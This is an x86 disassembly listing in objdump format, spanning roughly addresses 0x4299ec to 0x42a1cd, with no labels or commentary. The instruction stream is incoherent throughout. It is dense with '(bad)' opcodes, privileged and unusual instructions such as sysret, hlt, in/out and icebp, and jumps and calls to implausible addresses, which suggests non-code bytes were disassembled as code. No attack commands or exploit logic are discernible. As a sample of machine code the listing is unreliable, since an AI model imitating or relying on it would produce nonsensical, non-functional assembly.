  4299ec:	mov    eax,DWORD PTR [ecx+0x514d500c]
  4299f2:	or     WORD PTR [ecx],0x8998
  4299f7:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  4299fd:	mov    edx,DWORD PTR [ecx+0x8]
  429a00:	mov    eax,DWORD PTR [ebp-0x8]
  429a03:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  429a0a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429a10:	inc    ebp
  429a11:	dec    eax
  429a12:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429a18:	add    edx,DWORD PTR [ecx-0x8]
  429a1b:	mov    ecx,DWORD PTR [ecx]
  429a1d:	clc    
  429a1e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  429a25:	mov    ecx,ebp
  429a27:	clc    
  429a28:	(bad)  
  429a29:	popf   
  429a2a:	inc    DWORD PTR [eax]
  429a2c:	ret    0x8b
  429a2f:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  429a35:	mov    edi,esp
  429a37:	hlt    
  429a38:	test   ecx,esi
  429a3a:	clc    
  429a3b:	or     BYTE PTR [ebp+0x7],al
  429a3e:	cmp    ecx,eax
  429a40:	pushf  
  429a41:	jb     0x429a76
  429a43:	add    BYTE PTR [eax-0x3f],al
  429a46:	inc    eax
  429a47:	daa    
  429a48:	inc    ebp
  429a49:	inc    ebp
  429a4a:	xor    eax,0x7f80803
  429a4f:	dec    ebp
  429a50:	cwde   
  429a51:	add    esi,DWORD PTR [edx]
  429a53:	clc    
  429a54:	cmp    DWORD PTR [ecx],ecx
  429a56:	or     al,0x8
  429a58:	add    al,BYTE PTR [ebp+0x2c]
  429a5b:	xor    eax,0x7350845
  429a60:	or     BYTE PTR [ebp+0x7],cl
  429a63:	lea    ebx,[eax-0x748dcdff]
  429a69:	add    BYTE PTR [eax*2-0x74b21438],cl
  429a70:	mov    edx,DWORD PTR [eax]
  429a72:	cld    
  429a73:	dec    ebp
  429a74:	push   eax
  429a75:	sub    edx,DWORD PTR [ecx-0x75]
  429a78:	add    eax,0xf172fc
  429a7d:	or     BYTE PTR [ebp+0x7],cl
  429a80:	add    eax,ecx
  429a82:	or     al,0x72
  429a84:	add    DWORD PTR [eax],eax
  429a86:	mov    ebx,0x29c2c1
  429a8b:	inc    ebp
  429a8c:	mov    eax,DWORD PTR [ebx]
  429a8e:	cmp    eax,0x3004d1c
  429a94:	xbegin 0x66c8268e
  429a9a:	clc    
  429a9b:	or     BYTE PTR [ebp+0x45],al
  429a9e:	cmp    DWORD PTR ds:0x78b089c,esi
  429aa4:	adc    BYTE PTR [ebp+0x45],cl
  429aa7:	lea    eax,[ebp+0x33727501]
  429aad:	add    cl,ch
  429aaf:	inc    ebp
  429ab0:	add    bl,ch
  429ab2:	add    BYTE PTR [ebx+0x45850845],cl
  429ab8:	je     0x429a45
  429aba:	push   ebx
  429abb:	or     al,0x85
  429abd:	dec    ebp
  429abe:	std    
  429abf:	mov    bh,bh
  429ac1:	mov    BYTE PTR [ebp-0x75],al
  429ac4:	mov    edi,eax
  429ac6:	or     al,0x89
  429ac8:	inc    ebp
  429ac9:	clc    
  429aca:	mov    esp,esp
  429acc:	hlt    
  429acd:	call   DWORD PTR [edi-0x37]
  429ad0:	push   eax
  429ad1:	or     al,0x51
  429ad3:	push   ebp
  429ad4:	xor    ebp,esp
  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
